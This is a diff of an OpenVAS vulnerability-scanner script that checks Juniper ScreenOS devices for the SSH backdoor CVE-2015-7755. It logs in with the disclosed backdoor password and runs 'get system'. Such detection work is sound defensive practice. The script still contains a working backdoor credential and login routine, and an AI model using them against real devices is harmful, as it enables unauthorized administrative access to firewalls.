@@ -1,6 +1,5 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_juniper_screenos_ssh_backdoor_12_2015.nasl 13568 2019-02-11 10:22:27Z cfischer $
 #
 # Backdoor in ScreenOS (SSH)
 #
@@ -31,43 +30,49 @@ if(description)
   script_cve_id("CVE-2015-7755", "CVE-2015-7754");
   script_tag(name:"cvss_base", value:"10.0");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
-  script_version("$Revision: 13568 $");
+  script_version("2019-09-02T07:13:48+0000");
 
   script_name("Backdoor in ScreenOS (SSH)");
 
   script_xref(name:"URL", value:"http://kb.juniper.net/index?page=content&id=JSA10713&actp=RSS");
   script_xref(name:"URL", value:"http://kb.juniper.net/index?page=content&id=JSA10712&actp=RSS");
 
-  script_tag(name:"vuldetect", value:"Try to login with backdoor credentials");
+  script_tag(name:"vuldetect", value:"Try to login with backdoor credentials.");
 
   script_tag(name:"insight", value:"It was possible to login using any username and the password: <<< %s(un='%s') = %u
 
- In February 2018 it was discovered that this vulnerability is being exploited by the 'DoubleDoor' Internet of Things
- (IoT) Botnet.");
+  In February 2018 it was discovered that this vulnerability is being exploited by the 'DoubleDoor' Internet of Things
+  (IoT) Botnet.");
 
   script_tag(name:"solution", value:"This issue was fixed in ScreenOS 6.2.0r19, 6.3.0r21, and all subsequent releases.");
 
   script_tag(name:"summary", value:"ScreenOS is vulnerable to an unauthorized remote administrative access to the device over SSH or telnet.");
+
   script_tag(name:"affected", value:"These issues can affect any product or platform running ScreenOS 6.2.0r15 through 6.2.0r18 and 6.3.0r12 through 6.3.0r20.");
 
   script_tag(name:"solution_type", value:"VendorFix");
   script_tag(name:"qod_type", value:"exploit");
 
-  script_tag(name:"last_modification", value:"$Date: 2019-02-11 11:22:27 +0100 (Mon, 11 Feb 2019) $");
+  script_tag(name:"last_modification", value:"2019-09-02 07:13:48 +0000 (Mon, 02 Sep 2019)");
   script_tag(name:"creation_date", value:"2015-12-21 10:33:33 +0100 (Mon, 21 Dec 2015)");
   script_category(ACT_ATTACK);
-  script_family("General");
+  script_family("Default Accounts");
   script_copyright("This script is Copyright (C) 2015 Greenbone Networks GmbH");
-  script_dependencies("ssh_detect.nasl");
+  script_dependencies("ssh_detect.nasl", "gb_default_credentials_options.nasl");
   script_require_ports("Services/ssh", 22);
   script_mandatory_keys("ssh/server_banner/available");
+  script_exclude_keys("default_credentials/disable_default_account_checks");
 
   exit(0);
 }
 
 include("ssh_func.inc");
 
-port = get_ssh_port(default:22);
+# If optimize_test = no
+if( get_kb_item( "default_credentials/disable_default_account_checks" ) )
+  exit( 0 );
+
+port = get_ssh_port( default:22 );
 
 soc = open_sock_tcp( port );
 if( ! soc ) exit( 0 );
@@ -77,14 +82,15 @@ user = 'netscreen';
 pass = "<<< %s(un='%s') = %u";
 
 login = ssh_login( socket:soc, login:user, password:pass, pub:FALSE, priv:FALSE, passphrase:FALSE );
-
 if( login == 0 )
 {
-  buf = ssh_cmd( socket:soc, cmd:'get system', nosh:TRUE, pty:TRUE, pattern:"Software Version: " );
+  cmd = 'get system';
+  res = ssh_cmd( socket:soc, cmd:cmd, nosh:TRUE, pty:TRUE, pattern:"Software Version: " );
   close( soc );
-  if("Product Name:" >< buf && "FPGA checksum" >< buf && "Compiled by build_master at" >< buf )
+  if( "Product Name:" >< res && "FPGA checksum" >< res && "Compiled by build_master at" >< res )
   {
-    security_message( port:port );
+    report = 'It was possible to login as user "' + user + '" with password "' + pass + '" and to execute the "' + cmd + '" command. Result:\n\n' + res;
+    security_message( port:port, data:report );
     exit( 0 );
   }
 }
